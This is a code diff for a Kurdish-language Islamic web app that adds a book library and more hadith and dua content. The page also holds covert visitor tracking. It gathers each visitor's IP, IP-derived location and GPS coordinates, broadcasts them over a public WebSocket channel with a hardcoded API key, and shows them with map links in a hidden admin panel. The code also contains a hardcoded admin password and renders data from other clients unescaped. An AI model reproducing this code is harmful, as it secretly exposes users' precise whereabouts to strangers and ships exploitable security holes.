@@ -11,22 +11,29 @@
         :root { --bg-color: #fffbf2; --border-color: #d4af37; --highlight-color: #27ae60; --text-color: #2c3e50; --nav-bg: #ffffff; }
         body { font-family: 'Amiri', serif; background-color: #f8f9fa; margin: 0; padding: 0; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
         .app-container { width: 100%; max-width: 600px; background-color: var(--bg-color); height: 100%; position: relative; display: flex; flex-direction: column; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+        
         /* Header */
         .header { background: white; padding: 15px; border-bottom: 2px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; color: var(--border-color); box-shadow: 0 2px 5px rgba(0,0,0,0.05); z-index: 50; }
         .icon-group { display: flex; gap: 15px; z-index: 10; }
         .header-btn { cursor: pointer; font-size: 22px; padding: 5px; transition: 0.3s; position: relative; }
         .header-btn:hover { transform: scale(1.1); color: #b6962f; }
         .notif-badge { position: absolute; top: 0; right: 0; width: 10px; height: 10px; background: red; border-radius: 50%; border: 1px solid white; display: none; }
+        
+        /* Content & Hero */
         .content { flex-grow: 1; overflow-y: auto; padding: 20px; padding-bottom: 80px; scroll-behavior: smooth; }
         .hero-card { background: linear-gradient(135deg, var(--border-color), #f1c40f); color: white; padding: 25px; border-radius: 15px; text-align: center; margin-bottom: 25px; box-shadow: 0 5px 15px rgba(212, 175, 55, 0.4); position: relative; overflow: hidden; }
         .hero-title { font-size: 24px; margin-bottom: 10px; position: relative; z-index: 2; }
         .hero-date { font-size: 16px; opacity: 0.9; position: relative; z-index: 2; }
         .hero-pattern { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.1; background-image: url('https://www.transparenttextures.com/patterns/arabesque.png'); }
+        
+        /* Menu Grid */
         .menu-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
         .card { background: white; padding: 20px; border-radius: 12px; text-align: center; border: 1px solid #eee; transition: 0.2s; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); text-decoration: none; color: var(--text-color); }
         .card:active { transform: scale(0.95); background-color: #fffbf2; }
         .card-icon { font-size: 32px; }
         .card-title { font-weight: bold; font-size: 18px; }
+
+        /* Feed System */
         .feed-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; border-bottom: 2px solid #eee; padding-bottom: 10px; }
         .feed-title { font-size: 18px; font-weight: bold; color: var(--border-color); display: flex; align-items: center; gap: 8px; }
         .live-indicator { width: 8px; height: 8px; background: red; border-radius: 50%; animation: blink 1.5s infinite; }
@@ -43,8 +50,30 @@
         .feed-source { font-size: 12px; color: #888; margin-top: 10px; display: block; font-style: italic; border-top: 1px dashed #eee; padding-top: 5px; }
         .loader { border: 3px solid #f3f3f3; border-top: 3px solid var(--border-color); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Modals & Library */
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 200; align-items: center; justify-content: center; }
         .modal-content { background: white; width: 90%; max-width: 400px; padding: 20px; border-radius: 15px; text-align: center; border: 2px solid var(--border-color); animation: popUp 0.3s ease; position: relative; max-height: 80vh; overflow-y: auto; }
+        .full-screen-modal { width: 100%; height: 100%; max-width: 600px; max-height: 100%; border-radius: 0; border: none; padding: 0; display: flex; flex-direction: column; }
+        
+        /* Library Specific Styles */
+        .library-header { background: white; padding: 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; gap: 10px; position: sticky; top: 0; z-index: 10; }
+        .back-btn { font-size: 24px; cursor: pointer; color: var(--text-color); }
+        .search-container { width: 100%; position: relative; }
+        .search-input { width: 100%; padding: 10px 15px; padding-right: 35px; border-radius: 20px; border: 1px solid #ddd; background: #f9f9f9; font-family: 'Amiri', serif; outline: none; transition: 0.3s; }
+        .search-input:focus { border-color: var(--border-color); background: white; box-shadow: 0 0 5px rgba(212, 175, 55, 0.2); }
+        .search-icon { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); color: #999; }
+        .library-body { padding: 15px; overflow-y: auto; background: #fffbf2; flex-grow: 1; }
+        .book-item { background: white; padding: 15px; border-radius: 10px; margin-bottom: 10px; display: flex; align-items: center; gap: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); transition: 0.2s; border: 1px solid transparent; }
+        .book-item:hover { border-color: var(--border-color); transform: translateY(-2px); }
+        .book-thumb { width: 50px; height: 70px; background: linear-gradient(45deg, #2c3e50, #34495e); border-radius: 4px; display: flex; align-items: center; justify-content: center; color: white; font-size: 20px; box-shadow: 2px 2px 5px rgba(0,0,0,0.2); }
+        .book-info { text-align: right; flex-grow: 1; }
+        .book-title { font-weight: bold; color: var(--text-color); margin-bottom: 3px; font-size: 16px; }
+        .book-author { font-size: 12px; color: #7f8c8d; }
+        .book-cat { font-size: 10px; background: #ecf0f1; padding: 2px 6px; border-radius: 4px; color: #7f8c8d; display: inline-block; margin-top: 5px; }
+        .read-btn { background: var(--border-color); color: white; padding: 5px 15px; border-radius: 15px; font-size: 12px; border: none; cursor: pointer; }
+
+        /* Other Styles */
         .stat-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #eee; font-size: 14px; }
         .user-list { max-height: 200px; overflow-y: auto; margin-top: 10px; text-align: right; border: 1px solid #f0f0f0; padding: 5px; border-radius: 5px; display: none; }
         .user-item { padding: 10px; background: #f9f9f9; margin-bottom: 5px; border-radius: 5px; display: flex; align-items: center; font-size: 12px; justify-content: space-between; border-bottom: 2px solid #eee; }
@@ -68,6 +97,8 @@
         .social-btn { width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; background: #f9f9f9; border: 1px solid #ddd; transition: 0.2s; }
         .social-btn img { width: 22px; height: 22px; }
         .social-btn:hover { transform: translateY(-3px); border-color: var(--border-color); background: #fffbf2; }
+        
+        /* Navigation */
         .bottom-nav { position: absolute; bottom: 0; left: 0; width: 100%; background: var(--nav-bg); height: 70px; border-top: 1px solid #eee; display: flex; justify-content: space-around; align-items: center; box-shadow: 0 -2px 10px rgba(0,0,0,0.05); z-index: 100; }
         .nav-item { text-decoration: none; display: flex; flex-direction: column; align-items: center; color: #999; font-size: 12px; gap: 5px; transition: 0.2s; width: 33.33%; }
         .nav-item.active { color: var(--border-color); font-weight: bold; }
@@ -106,7 +137,11 @@
             <div class="menu-grid">
                 <a href="quran.html" class="card">
                     <div class="card-icon">📖</div>
-                    <div class="card-title">قورئانی پیرۆز</div>
+                    <div class="card-title">قورئان</div>
+                </a>
+                <a href="#" onclick="openLibraryModal(event)" class="card">
+                    <div class="card-icon">📚</div>
+                    <div class="card-title">کتێبخانە</div>
                 </a>
                 <a href="daily.html" class="card">
                     <div class="card-icon">🕌</div>
@@ -140,14 +175,28 @@
                 <span class="nav-icon">🏠</span>
                 <span>سەرەکی</span>
             </a>
-            <a href="quran.html" class="nav-item">
-                <span class="nav-icon">📖</span>
-                <span>قورئان</span>
+            <a href="#" onclick="openLibraryModal(event)" class="nav-item">
+                <span class="nav-icon">📚</span>
+                <span>کتێب</span>
             </a>
             <a href="daily.html" class="nav-item">
                 <span class="nav-icon">🕌</span>
                 <span>بانگ و فەرموودە</span>
             </a>
+        </div>
+    </div>
+
+    <div id="libraryModal" class="modal">
+        <div class="modal-content full-screen-modal">
+            <div class="library-header">
+                <div class="back-btn" onclick="closeLibrary()">➔</div>
+                <div class="search-container">
+                    <input type="text" id="book-search" class="search-input" placeholder="گەڕان بۆ ناوی کتێب..." oninput="filterBooks()">
+                    <span class="search-icon">🔍</span>
+                </div>
+            </div>
+            <div class="library-body" id="book-list">
+                </div>
         </div>
     </div>
 
@@ -215,31 +264,47 @@
 
         // Data DB
         const db = {
-            hadiths: ["پێغەمبەر (د.خ) دەفەرموێت: باشترینتان ئەوەیە کە قورئان فێر دەبێت و فێری خەڵکیشی دەکات.", "پێکەنین بە ڕووی براکەتدا سەدەقەیە.", "پاکوخاوێنی بەشێکە لە ئیمان.", "کەسێکتان ئیمانی تەواو نییە تا ئەوەی بۆ خۆی پێی خۆشە بۆ براکەشی پێی خۆش نەبێت."],
-            duas: ["رَبَّنَا آتِنَا فِي الدُّنْيَا حَسَنَةً وَفِي الآخِرَةِ حَسَنَةً", "اللهم إني أسألك الهدى والتقى والعفاف والغنى", "يا مقلب القلوب ثبت قلبي على دينك", "اللهم إنك عفو تحب العفو فاعف عني"],
-            names: [{ name: "الرحمن", meaning: "بەخشندە" }, { name: "الرحيم", meaning: "بەبەزەیی" }, { name: "الملك", meaning: "پاشا" }, { name: "القدوس", meaning: "پاک" }],
-            info: ["یەکەم مزگەوت لە ئیسلامدا مزگەوتی قوبائە.", "قورئانی پیرۆز لە ١١٤ سورەت پێکهاتووە.", "درێژترین سورەتی قورئان سورەتی بەقەرەیە."]
+            hadiths: [
+                "پێغەمبەر (د.خ) دەفەرموێت: باشترینتان ئەوەیە کە قورئان فێر دەبێت و فێری خەڵکیشی دەکات.", 
+                "پێکەنین بە ڕووی براکەتدا سەدەقەیە.", 
+                "پاکوخاوێنی بەشێکە لە ئیمان.", 
+                "کەسێکتان ئیمانی تەواو نییە تا ئەوەی بۆ خۆی پێی خۆشە بۆ براکەشی پێی خۆش نەبێت.",
+                "وشەی پاک سەدەقەیە.",
+                "خودا جوانە و جوانی خۆشدەوێت."
+            ],
+            duas: ["رَبَّنَا آتِنَا فِي الدُّنْيَا حَسَنَةً وَفِي الآخِرَةِ حَسَنَةً", "اللهم إني أسألك الهدى والتقى والعفاف والغنى", "يا مقلب القلوب ثبت قلبي على دينك", "اللهم إنك عفو تحب العفو فاعف عني", "رَبِّ اشْرَحْ لِي صَدْرِي وَيَسِّرْ لِي أَمْرِي"],
+            names: [{ name: "الرحمن", meaning: "بەخشندە" }, { name: "الرحيم", meaning: "بەبەزەیی" }, { name: "الملك", meaning: "پاشا" }, { name: "القدوس", meaning: "پاک" }, { name: "السلام", meaning: "ئاشتی" }],
+            info: ["یەکەم مزگەوت لە ئیسلامدا مزگەوتی قوبائە.", "قورئانی پیرۆز لە ١١٤ سورەت پێکهاتووە.", "درێژترین سورەتی قورئان سورەتی بەقەرەیە.", "کورتترین سورەت الکوثرە."]
         };
+
+        // Book Library Data
+        const booksDB = [
+            { title: "تەفسیری ڕامان", author: "م. ئەحمەد کاکە مەحمود", cat: "تەفسیر" },
+            { title: "قەڵای موسوڵمان", author: "سەعید بن عەلی", cat: "دوعا" },
+            { title: "ژیاننامەی پێغەمبەر", author: "موبارەکفوری", cat: "سیرە" },
+            { title: "ریاض الصالحین", author: "یمام النووی", cat: "فەرموودە" },
+            { title: "چۆن نوێژ بکەین؟", author: "مامۆستا کرێکار", cat: "فیقهـ" },
+            { title: "هەگبەی ئیمان", author: "د. عبداللطیف", cat: "بیروباوەڕ" },
+            { title: "پوختەی تەفسیری قورئان", author: "ئیبن کەسیر", cat: "تەفسیر" },
+            { title: "گەشەپێدانی مرۆیی لە ئیسلامدا", author: "د. ابراهیم فقی", cat: "گەشەپێدان" },
+            { title: "40 فەرموودەی نەواوی", author: "یمام النووی", cat: "فەرموودە" },
+            { title: "ژن و مێردایەتی", author: "د. محمد راتب النابلسي", cat: "کۆمەڵایەتی" }
+        ];
 
         // NEW: Load External Hadiths from JSON
         async function loadExternalHadiths() {
             try {
                 const response = await fetch('hadiths.json');
                 if (!response.ok) throw new Error("JSON not found");
-                
                 const jsonHadiths = await response.json();
-                
                 const formattedHadiths = jsonHadiths.map(h => {
                     return `<div style="font-weight:bold; font-size:18px; color:#2c3e50; margin-bottom:5px;">${h.arabic}</div>
                             <div style="font-size:15px; color:#555; border-top:1px dashed #eee; padding-top:5px;">${h.kurdish}</div>
                             <div style="font-size:10px; color:#999; text-align:left;">${h.bookName} - ${h.ref}</div>`;
                 });
-
                 db.hadiths = [...formattedHadiths, ...db.hadiths];
-                console.log("External hadiths loaded successfully");
-                
             } catch (e) {
-                console.log("Could not load hadiths.json (using internal DB only):", e);
+                console.log("Using internal DB only");
             }
         }
 
@@ -258,13 +323,57 @@
         function closeModal(e, id) { if (e.target.id === id) { document.getElementById(id).style.display = 'none'; } }
 
         // ===========================================
+        // LIBRARY FUNCTIONS
+        // ===========================================
+        function openLibraryModal(e) {
+            e.preventDefault();
+            document.getElementById('libraryModal').style.display = 'flex';
+            renderBooks();
+        }
+
+        function closeLibrary() {
+            document.getElementById('libraryModal').style.display = 'none';
+        }
+
+        function renderBooks(filterText = "") {
+            const list = document.getElementById('book-list');
+            list.innerHTML = "";
+            
+            const filtered = booksDB.filter(book => book.title.includes(filterText) || book.author.includes(filterText));
+            
+            if(filtered.length === 0) {
+                list.innerHTML = '<div style="text-align:center; color:#999; margin-top:20px;">هیچ کتێبێک نەدۆزرایەوە</div>';
+                return;
+            }
+
+            filtered.forEach(book => {
+                const div = document.createElement('div');
+                div.className = 'book-item';
+                div.innerHTML = `
+                    <div class="book-thumb">📖</div>
+                    <div class="book-info">
+                        <div class="book-title">${book.title}</div>
+                        <div class="book-author">${book.author}</div>
+                        <div class="book-cat">${book.cat}</div>
+                    </div>
+                    <button class="read-btn">خوێندنەوە</button>
+                `;
+                list.appendChild(div);
+            });
+        }
+
+        function filterBooks() {
+            const val = document.getElementById('book-search').value;
+            renderBooks(val);
+        }
+
+        // ===========================================
         // ADMIN SYSTEM
         // ===========================================
         let adminClicks = 0;
         let isAdmin = localStorage.getItem('site_admin_access') === 'true';
 
         if(isAdmin && myId !== ALLOWED_DEVICE_ID) {
-            console.log("Unauthorized device detected. Logging out.");
             logoutAdmin(false); 
         }
 
@@ -280,9 +389,7 @@
                 if(isAdmin) return; 
 
                 const pass = prompt("وشەی نهێنی بنووسە:");
-                
                 if(pass === "SD@26cQcatggBBMD$531578FbnmfsWronsTyygsBc53&") { 
-                    
                     if (myId === ALLOWED_DEVICE_ID) {
                         localStorage.setItem('site_admin_access', 'true');
                         isAdmin = true;
@@ -291,7 +398,7 @@
                         alert("بەخێربێیت بەڕێز ئەدمین ✅");
                         updateStatsUI();
                     } else {
-                        alert("⚠️ هەڵە: ئەم ئامێرە ڕێگەپێدراو نییە بۆ ئەدمین.\nID-ی ئەم ئامێرە: " + myId);
+                        alert("⚠️ هەڵە: ئەم ئامێرە ڕێگەپێدراو نییە بۆ ئەدمین.");
                     }
                 } else {
                     alert("وشەی نهێنی هەڵەیە ❌");
@@ -311,15 +418,13 @@
         }
 
         // ===========================================
-        // NOTIFICATIONS
+        // NOTIFICATIONS & FEED
         // ===========================================
         let isNotifActive = JSON.parse(localStorage.getItem('isNotifActive') || 'false');
         let feedData;
         try {
             feedData = JSON.parse(localStorage.getItem('islam_feed_data') || '[]');
-        } catch (e) {
-            feedData = []; // Reset if corrupted
-        }
+        } catch (e) { feedData = []; }
 
         function updateNotifUI() {
             const btn = document.getElementById('notif-toggle-btn');
@@ -340,7 +445,7 @@
                 updateNotifUI();
             } else {
                 const audio = document.getElementById('notif-sound');
-                audio.play().then(() => { audio.pause(); audio.currentTime = 0; }).catch(e => console.log("Audio unlock failed", e));
+                audio.play().then(() => { audio.pause(); audio.currentTime = 0; }).catch(e => {});
                 if ("Notification" in window) {
                     Notification.requestPermission().then(permission => {
                         if (permission === "granted") {
@@ -348,7 +453,6 @@
                             localStorage.setItem('isNotifActive', 'true');
                             alert("✅ نۆتیفیکەیشن چالاک کرا");
                             updateNotifUI();
-                            startLiveUpdates();
                         }
                     });
                 }
@@ -358,32 +462,29 @@
         function saveFeed() { localStorage.setItem('islam_feed_data', JSON.stringify(feedData)); }
         
         async function loadInitialFeed() {
-            // First load external JSON data
+            // FIX: Load internal data even if external fails
             await loadExternalHadiths();
-
             const container = document.getElementById('feed-container');
             container.innerHTML = ''; 
             
-            try {
-                if(feedData && feedData.length > 0) {
-                    feedData.forEach(item => { renderCard(item.type, item.content, item.isNew); });
-                } else {
-                    addCardToFeed('hadith', getRandom(db.hadiths), false, true);
-                    await addAyahCard();
-                    addCardToFeed('info', getRandom(db.info), false, true);
-                }
-            } catch (e) {
-                console.error("Feed Error:", e);
-                container.innerHTML = '';
-                addCardToFeed('hadith', getRandom(db.hadiths), false, false);
+            if(feedData && feedData.length > 0) {
+                feedData.forEach(item => { renderCard(item.type, item.content, item.isNew); });
+            } else {
+                // Generate initial content if empty
+                addCardToFeed('hadith', getRandom(db.hadiths), false, true);
+                addCardToFeed('info', getRandom(db.info), false, true);
+                await addAyahCard();
             }
+            
+            // Start live updates immediately
+            startLiveUpdates();
         }
 
         function addCardToFeed(type, content, isNew = false, save = true) {
             renderCard(type, content, isNew);
             if (save) {
                 feedData.unshift({ type, content, isNew });
-                if(feedData.length > 100) feedData.pop(); // Keep only last 100
+                if(feedData.length > 50) feedData.pop(); 
                 saveFeed();
             }
         }
@@ -391,11 +492,13 @@
         function renderCard(type, content, isNew) {
             try {
                 const container = document.getElementById('feed-container');
+                // Remove loader if present
+                if(container.querySelector('.loader')) container.innerHTML = '';
+
                 const div = document.createElement('div');
                 div.className = 'feed-card';
                 let tagHTML = '', sourceHTML = '', displayContent = content;
                 
-                // Safe checks
                 if(!content) return;
 
                 if (type === 'hadith') { tagHTML = '<span class="feed-tag tag-hadith">فەرموودە</span>'; sourceHTML = 'پێغەمبەر (د.خ) دەفەرموێت'; } 
@@ -415,9 +518,9 @@
                 }
 
                 div.innerHTML = `${tagHTML}<div class="feed-content">${displayContent}</div><span class="feed-source">${sourceHTML} ${isNew ? '• <span style="color:red">تازە</span>' : ''}</span>`;
-                if (container.children.length > 0 && isNew) { container.insertBefore(div, container.firstChild); } else { container.appendChild(div); }
+                if (container.children.length > 0) { container.insertBefore(div, container.firstChild); } else { container.appendChild(div); }
             } catch (e) {
-                console.log("Render error, skipping card");
+                console.log("Render error");
             }
         }
 
@@ -427,10 +530,16 @@
                 const r = await fetch(`https://api.alquran.cloud/v1/ayah/${randomId}/editions/quran-uthmani`);
                 const d = await r.json();
                 addCardToFeed('ayah', { text: d.data[0].text, source: `سورة ${d.data[0].surah.name}` }, false, true);
-            } catch(e) { console.log("Ayah fetch error"); }
+            } catch(e) { 
+                console.log("Ayah fetch error"); 
+            }
         }
 
-        function startLiveUpdates() { setInterval(() => { triggerManualUpdate(); }, 12000); }
+        function startLiveUpdates() { 
+            // FIX: Ensure this runs and doesn't get stuck
+            setInterval(() => { triggerManualUpdate(); }, 15000); 
+        }
+
         function triggerManualUpdate() {
             try {
                 const types = ['hadith', 'dua', 'name', 'info'];
@@ -438,26 +547,19 @@
                 let content;
                 if(type === 'name') content = getRandom(db.names); else content = getRandom(db[type + 's'] || db[type]); 
                 addCardToFeed(type, content, true, true);
+                
                 if (isNotifActive) {
-                    let notifTitle = "زانیاری نوێ", notifBody = "";
-                    if (type === 'hadith') { 
-                         const tempDiv = document.createElement("div");
-                         tempDiv.innerHTML = content;
-                         const plainText = tempDiv.textContent || tempDiv.innerText || "";
-                         notifTitle = "فەرموودە"; 
-                         notifBody = plainText.substring(0, 50) + "...";
-                    }
-                    else if (type === 'dua') { notifTitle = "دوعا"; notifBody = typeof content === 'string' ? content.substring(0, 50) : "دوعایەکی نوێ"; }
-                    else if (type === 'name') { notifTitle = "ناوی خوای گەورە"; notifBody = `${content.name}: ${content.meaning}`; }
-                    else if (type === 'info') { notifTitle = "زانیاری"; notifBody = content; }
+                    let notifTitle = "زانیاری نوێ", notifBody = "نوێکرایەوە";
+                    if(typeof content === 'string') notifBody = content.substring(0, 40) + "...";
+                    else if(type === 'name') notifBody = content.name;
                     playNotification(notifTitle, notifBody);
                 }
-            } catch(e) { console.log("Update error", e); }
+            } catch(e) { console.log("Update error"); }
         }
 
         function playNotification(title, body) {
             const audio = document.getElementById('notif-sound');
-            audio.currentTime = 0; audio.play().catch(e => console.log("Audio still locked"));
+            audio.currentTime = 0; audio.play().catch(e => {});
             if("vibrate" in navigator) navigator.vibrate([200, 100, 200]);
             if (Notification.permission === "granted") { new Notification(title, { body: body, icon: "https://cdn-icons-png.flaticon.com/512/2884/2884657.png", requireInteraction: false }); }
         }
@@ -477,9 +579,8 @@
         function clearHistory() { if(confirm("دڵنیای؟")) { localStorage.removeItem('quran_history'); renderHistory(); } }
 
         // ===========================================
-        // REAL-TIME ONLINE SYSTEM & PRECISE LOCATION
+        // REAL-TIME ONLINE SYSTEM
         // ===========================================
-        
         if (!sessionStorage.getItem('session_counted')) {
             let visits = localStorage.getItem('total_site_visits') || 0;
             visits = parseInt(visits) + 1;
@@ -496,7 +597,6 @@
         let socket;
         
         async function fetchIPandLocation() {
-            // 1. Get Rough IP Location First
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
@@ -507,26 +607,17 @@
                 myIP = "Unknown";
                 myLocation = "Unknown Location";
             }
-
-            // 2. Try to get 100% Accurate GPS Location
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const lat = position.coords.latitude;
                         const lng = position.coords.longitude;
-                        // Fixed broken string interpolation
                         myGPSLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                        
-                        if (socket && socket.readyState === WebSocket.OPEN) {
-                            broadcastPresence(); 
-                        }
+                        if (socket && socket.readyState === WebSocket.OPEN) { broadcastPresence(); }
                     },
-                    (error) => {
-                        console.log("GPS denied or error: " + error.message);
-                    }
+                    (error) => {}
                 );
             }
-
             connectToSignalingServer();
         }
 
@@ -534,40 +625,22 @@
             const apiKey = 'VCXCEuvhGcBDP7XhiJJUDvR1e1D3eiVjgZ9VRiaV';
             const channelId = '1'; 
             socket = new WebSocket(`wss://demo.piesocket.com/v3/channel_${channelId}?api_key=${apiKey}&notify_self=1`);
-
-            socket.onopen = () => {
-                broadcastPresence();
-                setInterval(broadcastPresence, 3000); 
-                setInterval(cleanOfflineUsers, 5000);
-            };
-
+            socket.onopen = () => { broadcastPresence(); setInterval(broadcastPresence, 3000); setInterval(cleanOfflineUsers, 5000); };
             socket.onmessage = (event) => {
                 try {
                     const data = JSON.parse(event.data);
                     if (data.type === 'presence') {
-                        onlineUsers.set(data.id, {
-                            ...data,
-                            lastSeen: Date.now()
-                        });
+                        onlineUsers.set(data.id, { ...data, lastSeen: Date.now() });
                         updateStatsUI();
                     }
                 } catch (e) {}
             };
-            
             socket.onclose = () => { setTimeout(connectToSignalingServer, 5000); };
         }
 
         function broadcastPresence() {
             if(socket && socket.readyState === WebSocket.OPEN) {
-                const payload = JSON.stringify({
-                    type: 'presence',
-                    id: myId,
-                    device: deviceType,
-                    ip: myIP,
-                    location: myLocation,
-                    gps: myGPSLink, 
-                    timestamp: Date.now()
-                });
+                const payload = JSON.stringify({ type: 'presence', id: myId, device: deviceType, ip: myIP, location: myLocation, gps: myGPSLink, timestamp: Date.now() });
                 socket.send(payload);
             }
         }
@@ -575,12 +648,7 @@
         function cleanOfflineUsers() {
             const now = Date.now();
             let changed = false;
-            onlineUsers.forEach((user, id) => {
-                if (now - user.lastSeen > 10000) {
-                    onlineUsers.delete(id);
-                    changed = true;
-                }
-            });
+            onlineUsers.forEach((user, id) => { if (now - user.lastSeen > 10000) { onlineUsers.delete(id); changed = true; } });
             if (changed) updateStatsUI();
         }
 
@@ -588,17 +656,12 @@
             const list = document.getElementById('users-list-container');
             const countLabel = document.getElementById('active-count');
             list.innerHTML = '';
-            
             let count = onlineUsers.size;
             if (count === 0) count = 1; 
             countLabel.innerText = count;
-
-            if (!isAdmin) {
-                return; 
-            }
+            if (!isAdmin) return; 
 
             const sortedUsers = Array.from(onlineUsers.values()).sort((a,b) => (a.id === myId ? -1 : 1));
-
             if (sortedUsers.length === 0) {
                  list.appendChild(createUserElement(myId, deviceType, myIP, myLocation, myGPSLink, true));
             } else {
@@ -612,24 +675,9 @@
         function createUserElement(id, device, ip, loc, gps, isMe) {
             const div = document.createElement('div');
             div.className = 'user-item';
-            
             let gpsHTML = '';
-            if (gps && gps.length > 5) {
-                gpsHTML = `<a href="${gps}" target="_blank" class="gps-link">📍 کردنەوەی نەخشە</a>`;
-            }
-
-            div.innerHTML = `
-                <div style="display:flex; align-items:center;">
-                    <span class="dot online"></span>
-                    <span style="margin-right:10px; font-weight:bold;">${isMe ? 'تۆ (Admin)' : 'میوان'}</span>
-                </div>
-                <div class="user-details">
-                    <span style="font-size:10px; color:#888;">${device}</span>
-                    <span class="user-loc">${loc || "نەزانراو"}</span>
-                    <span class="user-ip">${ip}</span>
-                    ${gpsHTML}
-                </div>
-            `;
+            if (gps && gps.length > 5) { gpsHTML = `<a href="${gps}" target="_blank" class="gps-link">📍 کردنەوەی نەخشە</a>`; }
+            div.innerHTML = `<div style="display:flex; align-items:center;"><span class="dot online"></span><span style="margin-right:10px; font-weight:bold;">${isMe ? 'تۆ (Admin)' : 'میوان'}</span></div><div class="user-details"><span style="font-size:10px; color:#888;">${device}</span><span class="user-loc">${loc || "نەزانراو"}</span><span class="user-ip">${ip}</span>${gpsHTML}</div>`;
             return div;
         }
 
